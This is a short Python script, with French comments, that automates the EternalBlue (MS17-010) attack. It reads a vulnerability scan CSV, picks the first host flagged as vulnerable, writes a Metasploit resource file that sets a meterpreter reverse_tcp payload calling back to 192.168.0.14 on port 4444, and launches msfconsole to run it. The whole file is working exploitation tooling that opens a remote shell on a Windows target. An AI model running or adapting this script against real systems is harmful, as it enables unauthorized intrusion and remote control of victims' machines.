import csv
import os
import subprocess

def run_eternalblue_exploit():
    vuln_csv = "/workspace/csv_results/vuln_results.csv"
    rc_path = "/workspace/every_exploits/eternalblue.rc"
    found = False

    # Lire les résultats CSV
    with open(vuln_csv, newline='') as csvfile:
        reader = csv.DictReader(csvfile)
        for row in reader:
            if "MS17-010" in row["exploits"]:
                found = True
                target_ip = row["ip"]
                break

    if not found:
        print("[!] No EternalBlue vulnerability found.")
        return

    print(f"[+] MS17-010 detected on {target_ip}, generating Metasploit RC file...")

    # Créer le script RC
    with open(rc_path, "w") as rc:
        rc.write("use exploit/windows/smb/ms17_010_eternalblue\n")
        rc.write(f"set RHOSTS {target_ip}\n")
        rc.write("set PAYLOAD windows/x64/meterpreter/reverse_tcp\n")
        rc.write("set LHOST 192.168.0.14\n")  # Adapter LHOST si besoin
        rc.write("set LPORT 4444\n")
        rc.write("exploit\n")  # Mode interactif

    print("[*] Launching Metasploit with EternalBlue exploit (interactive)...")

    # Lancer msfconsole via bash avec les bons chemins et contextes
    subprocess.run([
        "bash", "-c",
        "BUNDLE_GEMFILE=/opt/tools/metasploit-framework/Gemfile "
        "/usr/local/rvm/gems/ruby-3.1.5@metasploit-framework/wrappers/bundle "
        "exec /opt/tools/metasploit-framework/msfconsole -r /workspace/every_exploits/eternalblue.rc"
    ])

if __name__ == "__main__":
    run_eternalblue_exploit()
